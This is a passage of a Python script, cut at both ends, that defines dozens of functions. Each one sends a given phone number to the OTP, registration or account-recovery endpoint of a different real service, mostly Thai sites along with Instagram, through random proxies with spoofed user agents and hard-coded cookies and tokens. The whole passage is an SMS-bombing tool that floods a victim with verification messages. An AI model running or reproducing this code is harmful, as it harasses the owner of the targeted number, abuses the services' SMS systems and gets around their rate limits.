_gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})

def smsapi12(phone):
    requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi13(phone):
    requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})

def smsapi14(phone):
    requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})

def smsapi15(phone):
    requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})

def smsapi16(phone):
    requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})

def smsapi17(phone):
    requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})

def smsapi18(phone):
    requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})

def smsapi19(phone):
    requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi20(phone):
    requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}.json,proxies={'http': 'http://' + random.choice(s)})

def smsapi21(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})

def smsapi22(phone):
    requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})

def smsapi23(phone):
    requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})

def smsapi24(phone):
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi25(phone):
    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi26(phone):
    requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})

def smsapi27(phone):
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})

def smsapi28(phone):
    requests.post("https://trainflix-api.xeersoft.co.th/api/otpphone/register",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/plain, */*","Content-Type": "application/json"},json={"numberphone": phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi29(phone):
    requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})

def smsapi30(phone):
    requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"},proxies={'http': 'http://' + random.choice(s)})

def smsapi31(phone):
    requests.post("https://chobrod.com/register",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"},data=f"ReturnUrl=%2F&UserName={phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR",proxies={'http': 'http://' + random.choice(s)})

def smsapi32(phone):
    requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi33(phone):
    requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})

def smsapi34(phone):
    requests.post("https://www.jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"},json={"phone_number":phone,"user_id":f"ak{phone}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi35(phone):
    requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi36(phone):
    requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})

def smsapi37(phone):
    requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile",proxies={'http': 'http://' + random.choice(s)})

def smsapi38(phone):
    requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone,proxies={'http': 'http://' + random.choice(s)})

def smsapi39(phone):
    requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi40(phone):
    post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})

def smsapi41(phone):
    requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})

def smsapi42(phone):
    requests.post("https://kaspy.com/sms_63Vswc5dWk/sms.php/",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Cookie": "PHPSESSID=mvqfmd1daih60ep28gj9nrn04s; __atssc=google%3B1; __atuvc=2%7C42; __atuvs=634df68d89321b08001; private_content_version=93eb667db1caa66571dcb26591913a1e; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=fSk22U7uobzfYUUe; section_data_ids=%7B%22cart%22%3A1666053825%2C%22messages%22%3A1666053825%2C%22customer%22%3A1666053825%2C%22compare-products%22%3A1666053825%2C%22last-ordered-items%22%3A1666053825%2C%22directory-data%22%3A1666053825%2C%22captcha%22%3A1666053825%2C%22instant-purchase%22%3A1666053825%2C%22persistent%22%3A1666053825%2C%22review%22%3A1666053825%2C%22wishlist%22%3A1666053825%2C%22chatData%22%3A1666053816%2C%22recently_viewed_product%22%3A1666053825%2C%22recently_compared_product%22%3A1666053825%2C%22product_data_storage%22%3A1666053825%2C%22paypal-billing-agreement%22%3A1666053825%7D; _ga=GA1.2.1819946247.1666053827; _gid=GA1.2.2014825757.1666053827; _gat=1; mage-messages="},data=f"phoneVerifyFromSites={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi43(phone):
    requests.post("https://m-api.hhh-st1.xyz/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":phone,"serviceName":"hihuay.com"},proxies={'http': 'http://' + random.choice(s)})

def smsapi44(phone):
    requests.post("https://api.best-inc.co.th/account/sendlogincode",headers={"content-type": "application/x-www-form-urlencoded","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},data=f"phoneNumber=%22{phone}%22",proxies={'http': 'http://' + random.choice(s)})

def smsapi45(phone):
    requests.post("https://api.watsons.co.th/api/v2/wtcth/forms/combinedRegistrationForm/steps/wtcth_combinedRegistrationForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",headers={"user-agent": generate_user_agent(),"authorization":"bearer KDT4GwC7WLHdgLurm3ChB_vvvBE"},json={"otpTokenRequest":{"action":"REGISTRATION","type":"SMS","countryCode":"66","target":phone},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":phone},"mobileNumber":phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi46(phone):
    requests.post("https://api.monkeyeveryday.com/graphql",headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","content-type": "application/json"},json={"operationName":"requestRegistrationOtp","variables":{"phone":phone},"query":"mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})

def smsapi47(phone):
    ru.post("https://www.tgfone.com/signin/add_register",headers={"content-type": "application/x-www-form-urlencoded","user-agent": generate_user_agent(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71;_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_gat_gtag_UA_163796127_1=1;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657955943.0;_ga=GA1.2.160165897.1657955937"},data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2",proxies={'http': 'http://' + random.choice(s)})

def smsapi48(phone):
    requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"},proxies={'http': 'http://' + random.choice(s)})

def smsapi49(phone):
    requests.post("https://api.yellowtire.com/api/user/request-otp",headers={"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"tel":phone},proxies={'http': 'http://' + random.choice(s)})

def smsapi50(phone):
    requests.post("https://graph.firster.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"operationName":"sendOtp","variables":{"input":{"mobileNumber":f"{phone[1:]}","phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})

def smsapi51(phone):
    requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"},proxies={'http': 'http://' + random.choice(s)})

def smsapi52(phone):
    requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}?gaClientId=2050278932.1666930228&user-type=buyer&lang=th",proxies={'http': 'http://' + random.choice(s)},headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","cookie": 